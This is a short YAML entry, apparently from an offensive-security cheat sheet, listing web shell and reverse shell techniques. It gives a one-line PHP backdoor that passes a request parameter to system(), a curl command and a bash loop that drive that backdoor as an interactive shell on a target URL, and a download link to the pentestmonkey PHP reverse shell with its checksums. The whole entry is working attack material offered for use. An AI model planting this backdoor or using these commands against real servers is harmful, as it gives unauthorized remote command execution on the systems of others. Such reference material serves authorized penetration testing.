---
functions:
  web-shell:
    - description: Tiny simple php backdoor `<?php echo system($_REQUEST['cmd']); ?>`. Accepts GET and POST requests.
      code: |
         curl -X POST http://target.com/path/to/shell.php -d "cmd=command"
    - description: Keeping curl persistent with the tiny php backdoor, Create a bash script add following code.
      code: |
        while true;do read -p "[>] halah@wibu:~$ " cmd;curl $1$cmd;done
        # Save the filename as cli.sh and give access to execute with chmod +x cli.sh
        Usage:
        ./cli.sh http://target.com/path/to/shell.php?cmd=
  reverse-shell:
    - description: Advanced webshell taken from pentest monkey [Download](/files/shells/php-reverse-shell-1.0.tar.gz) [Source webpage](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
      code: |
        MD5sum:2bdf99cee7b302afdc45d1d51ac7e373
        SHA1sum: 30a26d5b5e30d819679e0d1eb44e46814892a4ee
---
